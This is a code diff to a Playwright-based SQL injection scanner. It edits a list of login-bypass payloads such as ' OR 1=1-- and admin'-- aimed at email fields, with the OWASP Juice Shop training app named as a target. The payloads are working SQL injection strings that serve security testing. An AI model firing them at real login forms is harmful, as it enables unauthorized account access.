@@ -571,12 +571,12 @@ class PlaywrightSQLiScanner(BaseScanner):
             {"email": "' OR 1=1--", "password": "a", "type": "or_1_1"},
             {"email": "' OR 1=1;--", "password": "a", "type": "or_1_1_semicolon"},
             {"email": "'--", "password": "a", "type": "comment_only"},
-            {"email": "admin@juice-sh.op'--", "password": "a", "type": "admin_comment"},
+            {"email": "admin@juice-sh.op' --", "password": "a", "type": "admin_comment"},
             {"email": "' OR '1'='1'--", "password": "a", "type": "or_string"},
             {"email": "' OR 1=1/*", "password": "a", "type": "block_comment"},
-            {"email": "admin'--", "password": "", "type": "admin_simple"},
-            {"email": "' OR true--", "password": "", "type": "or_true"},
-            {"email": "') OR 1=1--", "password": "", "type": "paren_or"},
+            {"email": "admin'--", "password": "a", "type": "admin_simple"},
+            {"email": "' OR true--", "password": "a", "type": "or_true"},
+            {"email": "') OR 1=1--", "password": "a", "type": "paren_or"},
         ]
         
         # Create a single page for all login tests
